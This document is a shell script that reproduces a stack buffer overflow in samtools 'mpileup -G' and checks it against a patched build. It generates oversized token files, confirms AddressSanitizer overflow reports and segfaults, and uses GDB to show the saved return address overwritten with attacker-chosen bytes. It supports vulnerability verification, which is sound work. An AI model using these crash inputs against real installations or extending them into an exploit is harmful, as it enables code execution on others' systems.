#!/bin/sh
# Local-only real samtools mpileup -G reproduction and controls.
set -u
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$ROOT"
mkdir -p runs evidence inputs
PASS=0
FAIL=0
ok()   { PASS=$((PASS+1)); printf 'PASS %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf 'FAIL %s: %s\n' "$1" "$2"; }

if ! sha256sum -c SHA256SUMS >runs/pin-check.out 2>&1; then
    cat runs/pin-check.out
    echo PIN_DRIFT_ABORT
    exit 2
fi
ok '8 immutable source/advisory/patch pins'

if ! sha256sum -c HARNESS_SHA256.txt >>runs/pin-check.out 2>&1; then
    cat runs/pin-check.out
    echo HARNESS_PIN_DRIFT_ABORT
    exit 2
fi
ok '4 immutable harness script pins'

for bin in runs/samtools-vuln-asan runs/samtools-fixed-asan \
           runs/samtools-vuln-plain runs/samtools-fixed-plain; do
    if [ ! -x "$bin" ]; then
        if ! sh build-real.sh; then
            echo BUILD_REAL_FAILED
            exit 2
        fi
        break
    fi
done

python3 - <<'PY'
from pathlib import Path
for n in (1023, 1024, 1200, 2048, 4096):
    Path(f'inputs/rg-{n}.bin').write_bytes(b'A' * 1023 + b'B' * (n - 1023) + b'\n')
PY

run_asan() {
    variant=$1
    n=$2
    LD_LIBRARY_PATH="$ROOT/work/htslib-asan/lib" \
    ASAN_OPTIONS='detect_leaks=0:abort_on_error=1' \
        "./runs/samtools-$variant-asan" mpileup -G "inputs/rg-$n.bin" \
        >"evidence/real-$variant-asan-$n.out" 2>&1
    RC=$?
}

run_asan vuln 1023
if [ "$RC" -eq 1 ] && grep -q 'no input file/data given' evidence/real-vuln-asan-1023.out; then
    ok 'vulnerable ASan 1023-byte token is the clean boundary'
else
    bad 'vulnerable ASan 1023 boundary' "rc=$RC"
fi

for n in 1024 1200 2048 4096; do
    run_asan vuln "$n"
    if [ "$RC" -ne 0 ] \
       && grep -q 'ERROR: AddressSanitizer: stack-buffer-overflow' "evidence/real-vuln-asan-$n.out" \
       && grep -q "WRITE of size $((n+1))" "evidence/real-vuln-asan-$n.out" \
       && grep -q 'bam_plcmd.c:1298' "evidence/real-vuln-asan-$n.out"; then
        ok "vulnerable real CLI ASan WRITE-$((n+1)) for $n-byte token"
    else
        bad "vulnerable ASan $n" "rc=$RC"
    fi
done

for n in 1023 1024 1200 2048 4096; do
    run_asan fixed "$n"
    if [ "$RC" -eq 1 ] && grep -q 'no input file/data given' "evidence/real-fixed-asan-$n.out"; then
        ok "fixed ASan $n-byte token clean"
    else
        bad "fixed ASan $n" "rc=$RC"
    fi
done

run_plain() {
    variant=$1
    n=$2
    LD_LIBRARY_PATH="$ROOT/work/htslib-plain/lib" \
        "./runs/samtools-$variant-plain" mpileup -G "inputs/rg-$n.bin" \
        >"evidence/real-$variant-plain-$n.out" 2>&1
    RC=$?
}

for n in 1023 1024; do
    run_plain vuln "$n"
    if [ "$RC" -eq 1 ] && grep -q 'no input file/data given' "evidence/real-vuln-plain-$n.out"; then
        ok "vulnerable plain $n-byte token survives"
    else
        bad "vulnerable plain $n" "rc=$RC"
    fi
done

for n in 1200 2048 4096; do
    run_plain vuln "$n"
    if [ "$RC" -eq 139 ]; then
        ok "vulnerable plain $n-byte token SIGSEGV"
    else
        bad "vulnerable plain $n" "rc=$RC"
    fi
done

for n in 1023 1024 1200 2048 4096; do
    run_plain fixed "$n"
    if [ "$RC" -eq 1 ] && grep -q 'no input file/data given' "evidence/real-fixed-plain-$n.out"; then
        ok "fixed plain $n-byte token clean"
    else
        bad "fixed plain $n" "rc=$RC"
    fi
done

if command -v gdb >/dev/null 2>&1; then
    gdb -q -batch -x harness/gdb-real.gdb --args runs/samtools-vuln-plain \
        >evidence/gdb-real-1200.out 2>&1
    if grep -q 'h=0x4242424242424242' evidence/gdb-real-1200.out \
       && grep -q '0x42.*0x42.*0x42.*0x42' evidence/gdb-real-1200.out; then
        ok 'GDB real frame: chosen 0x42 bytes and hash pointer 0x4242424242424242'
    else
        bad 'GDB 1200 pointer control' 'missing chosen pointer/readback'
    fi

    gdb -q -batch -x harness/gdb-real-2048.gdb --args runs/samtools-vuln-plain \
        >evidence/gdb-real-2048.out 2>&1
    if grep -q '0x7fffffff.*:.*0x4242424242424242' evidence/gdb-real-2048.out \
       && grep -q '#1.*0x4242424242424242' evidence/gdb-real-2048.out; then
        ok 'GDB real frame: saved return address overwritten with 0x4242424242424242'
    else
        bad 'GDB 2048 saved RIP' 'missing chosen saved return address'
    fi
else
    bad 'GDB unavailable' 'rung-4 readback not exercised'
fi

{
    printf 'SOURCE_PINS 8/8\n'
    printf 'HARNESS_PINS 4/4\n'
    printf 'BUILT_BINARIES 4\n'
    printf 'VULN_ASAN_BOUNDARY 1023 clean; 1024 WRITE-1025; 4096 WRITE-4097\n'
    printf 'FIXED_ASAN 1023/1024/1200/2048/4096 clean\n'
    printf 'VULN_PLAIN 1024 survives; 1200/2048/4096 SIGSEGV\n'
    printf 'GDB_1200 hash=0x4242424242424242; GDB_2048 saved_rip=0x4242424242424242\n'
    printf 'RESULT %s PASS / %s FAIL\n' "$PASS" "$FAIL"
} >runs/summary.txt
cat runs/summary.txt
[ "$FAIL" -eq 0 ] || exit 1
printf 'RUN_ALL_OK %s PASS / %s FAIL\n' "$PASS" "$FAIL"
